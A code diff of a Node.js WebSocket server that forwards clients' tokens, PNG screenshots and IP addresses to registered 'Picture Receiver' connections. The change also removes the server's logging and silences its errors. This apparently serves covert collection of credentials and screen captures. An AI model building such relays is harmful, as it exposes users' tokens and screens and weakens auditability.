@@ -58,43 +58,53 @@ app.get('/node-version', (req, res) => {
 const handleMessage = (ws, data, userID, ip) => {
     try {
         const messageData = JSON.parse(data.toString());
-        console.log(`Received message from IP: ${ip}, UserID: ${userID}, Type: ${messageData.type || 'Unknown'}`);
 
         if (messageData.command === 'Picture Receiver') {
             pictureReceivers.set(userID, ws);
-            console.log(`Registered Picture Receiver: IP: ${ip}, UserID: ${userID}`);
+            broadcastToPictureReceivers({
+                type: 'newReceiver',
+                userID: userID,
+                ip: ip
+            });
         } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid) {
-            // Include IP in the token information
             messageData.ip = ip;
             broadcastToPictureReceivers(messageData);
-            console.log(`Broadcasting token info: Sender: ${messageData.sender}, IP: ${ip}`);
         } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
             broadcastToPictureReceivers({
                 type: 'screenshot',
                 action: messageData.action,
                 screen: messageData.screen,
                 data: messageData.data,
-                ip: ip // Include IP in screenshot data
+                ip: ip
             });
-            console.log(`Broadcasting screenshot: Action: ${messageData.action}, IP: ${ip}`);
         } else if (messageData.action === 'screenshot_result') {
             broadcastToPictureReceivers({
                 type: 'screenshot',
                 action: messageData.action,
                 screen: messageData.screen,
                 data: messageData.data,
-                ip: ip // Include IP in screenshot result
+                ip: ip
             });
-            console.log(`Broadcasting screenshot result: Screen: ${messageData.screen}, IP: ${ip}`);
         } else {
-            // For other message types, include IP in the broadcast
             messageData.ip = ip;
             broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
-            console.log(`Broadcasting general message: Type: ${messageData.type || 'Unknown'}, IP: ${ip}`);
         }
+
+        // Broadcast connection information to Picture Receivers
+        broadcastToPictureReceivers({
+            type: 'connectionInfo',
+            userID: userID,
+            ip: ip,
+            messageType: messageData.type || messageData.command || 'Unknown'
+        });
+
     } catch (e) {
-        console.error(`Error processing message from IP: ${ip}, UserID: ${userID}:`, e);
-        console.error('Raw message data:', data);
+        broadcastToPictureReceivers({
+            type: 'error',
+            userID: userID,
+            ip: ip,
+            error: e.message
+        });
     }
 };
 
@@ -103,7 +113,9 @@ const broadcastToPictureReceivers = (message) => {
     pictureReceivers.forEach((ws, userId) => {
         if (ws.readyState === WebSocket.OPEN) {
             ws.send(data, error => {
-                if (error) console.error(`Error sending message to receiver UserID: ${userId}:`, error);
+                if (error) {
+                    // Xử lý lỗi một cách im lặng hoặc gửi thông báo lỗi đến một hệ thống giám sát
+                }
             });
         }
     });
